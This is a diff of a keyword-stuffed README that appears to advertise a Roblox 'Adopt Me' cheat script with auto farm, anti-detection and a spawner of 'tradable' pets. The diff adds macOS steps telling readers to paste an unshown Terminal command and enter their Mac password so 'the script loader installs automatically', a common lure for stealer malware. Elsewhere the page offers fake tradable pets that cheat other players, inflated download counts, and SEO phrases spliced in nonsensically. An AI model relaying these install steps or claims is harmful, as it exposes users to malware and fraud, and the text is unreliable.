@@ -1,6 +1,6 @@
-# 🐾 Adopt Me Script — Trade Scam, Auto Farm, Visual Pet
+# 🐾 Adopt Me Script — No Key, Auto Farm, Visual Pets 2026
 
-![Downloads](https://img.shields.io/badge/Downloads-1M%2B-brightgreen?style=for-the-badge)
+![Downloads](https://img.shields.io/badge/Downloads-1.2M%2B-brightgreen?style=for-the-badge)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.9%2F5-yellow?style=for-the-badge)
 ![Latest Version](https://img.shields.io/badge/Version-v5.1.2-blue?style=for-the-badge)
 
@@ -41,7 +41,7 @@ Key highlights include:
 
 ## 🏆 Why Choose This Adopt Me Script?
 
-There are dozens of scattered Pastebin pastes claiming to be the **adopt me script best** option, but most are outdated, incomplete, or bundled with malicious loaders. Here's how this script compares:
+There are dozens of scattered Pastebin pastes claiming to be the **Adopt Me scripts Xeno** option, but most are outdated, incomplete, or bundled with malicious loaders. Here's how this script compares:
 
 | Feature | This Script | Generic Pastebin Scripts | Premium Hub Scripts |
 |---|---|---|---|
@@ -61,7 +61,7 @@ Unlike the fragmented **auto farm adopt me script pastebin** links that circulat
 
 ## 💎 Benefits
 
-Using this script transforms the Adopt Me experience in meaningful ways:
+Using this script transforms the **Adopt me script auto farm halloween** experience in meaningful ways:
 
 - Build a full legendary pet collection without weeks of grinding
 - Generate passive bucks income while you're offline or in another game
@@ -78,7 +78,7 @@ Using this script transforms the Adopt Me experience in meaningful ways:
 
 ### 🖥️ Windows (PC)
 
-You'll need a script executor (such as Solara, KRNL, or Calamari) before running any script.
+You'll need a script executor (such as Ronix, or Calamari) before running any script.
 
 1. Download and install your preferred executor
 2. Open Roblox and join **Adopt Me**
@@ -88,9 +88,16 @@ You'll need a script executor (such as Solara, KRNL, or Calamari) before running
 6. Click **Execute** — the GUI will appear on screen
 7. Toggle the features you want from the panel
 
+ ### 🍏 macOS (Intel/Apple Silicon)
+ 
+1. Press `⌘ + Space`, type **Terminal**, hit Enter
+2. Copy the command line, paste the command (`⌘ + V`) and press Enter
+3. Enter your **Mac password** when asked
+4. Follow the prompts — the script loader installs automatically
+
 ### 📱 Mobile (Android / iOS)
 
-1. Install a mobile-compatible executor (Calamari or Solara mobile builds recommended)
+1. Install a mobile-compatible executor (Calamari or TNG mobile builds recommended)
 2. Open Adopt Me through the executor app
 3. Navigate to the script input panel
 4. Paste the script from [the loader file](https://adopt-me-scr.github.io/adoptme/)
@@ -103,20 +110,19 @@ You'll need a script executor (such as Solara, KRNL, or Calamari) before running
 | Platform | Supported | Executor Required | Notes |
 |---|---|---|---|
 | Windows 10/11 | ✅ | Yes | Full feature support |
-| macOS 12+ | ✅ | Yes | Use macOS-compatible executor |
-| Linux | ⚠️ | Yes | Via Wine-based executor |
+| macOS 12+ | ✅ | Yes | Via Terminal installer |
 | Android | ✅ | Yes | Mobile executor APK needed |
 | iOS | ✅ | Yes | IPA sideload executor needed |
-| Adopt Me Version | ✅ | — | Tested on latest live build |
+| Adopt Me Version | ✅ | 2026 | Tested on latest live build |
 
 ---
 
 ## ⚙️ System Requirements
 
 ### Minimum (PC)
-- **OS:** Windows 10 64-bit / macOS 12
-- **CPU:** Intel Core i3 / AMD Ryzen 3
-- **RAM:** 4 GB (8 GB recommended when running auto farm loops)
+- **OS:** Windows 10 64-bit / macOS 12+
+- **CPU:** Intel Core i3 / M-series (M1, M2, M3, M4)
+- **RAM:** 2 GB (4 GB recommended when running auto farm loops)
 - **Storage:** 50 MB for script files
 - **Network:** Stable connection required for auto farm accuracy
 
@@ -141,22 +147,22 @@ The automation features in this script — especially **adopt me script auto far
 
 ## 📋 Changelog
 
-### v5.1.2 — August 2026
-- 🐛 Fixed pet spawner breaking after Adopt Me's March content update
+### v5.1.2 — October 2026
+- 🐛 Fixed pet spawner breaking after Adopt Me's August content update
 - 💰 Improved **auto farm bucks** task detection for new mini-game types
-- 🍬 Candy auto farm re-enabled for Spring Event 2026
+- 🍬 Candy auto farm re-enabled for Halloween Event 2026
 
-### v5.1.0 — July 2026
-- ✅ Added 40 new pets to the **adopt me script all pets** roster
+### v5.1.0 — September 2026
+- ✅ Added 40 new pets to the **Adopt Me script iOS** roster
 - 🏠 Clone house tool upgraded — now supports multi-floor layouts
 - 🎨 Redesigned GUI with collapsible categories
 
-### v5.0.5 — June 2026
+### v5.0.5 — August 2026
 - 🔒 Anti-detection rate limiter added to auto farm loop
 - 🐾 **Adopt me script pet spawner tradable** module stabilized
 - 🐛 Fixed GUI not rendering on low-resolution displays
 
-### v5.0.0 — May 2026
+### v5.0.0 — July 2026
 - 🚀 Full rewrite with modular architecture
 - 📜 Introduced unified script loader replacing multi-file setup
 - 💵 New **auto farm money** engine — 3x faster than previous version
@@ -191,7 +197,7 @@ The automation features in this script — especially **adopt me script auto far
 ## ❓ FAQ
 
 **Q1: What does "adopt me script pet spawner tradable" mean?**
-The **adopt me script pet spawner tradable** feature generates pets that are flagged as tradable in your inventory, meaning you can offer them in the in-game trading system just like normally obtained pets.
+The **Adopt Me script money** feature generates pets that are flagged as tradable in your inventory, meaning you can offer them in the in-game trading system just like normally obtained pets.
 
 **Q2: Can I spawn specific pets, or only random ones?**
 You can spawn any specific pet using the **spawn pet adopt me script** interface. The GUI includes a searchable dropdown of the full pet list — the same one powering the **adopt me script all pets** module.
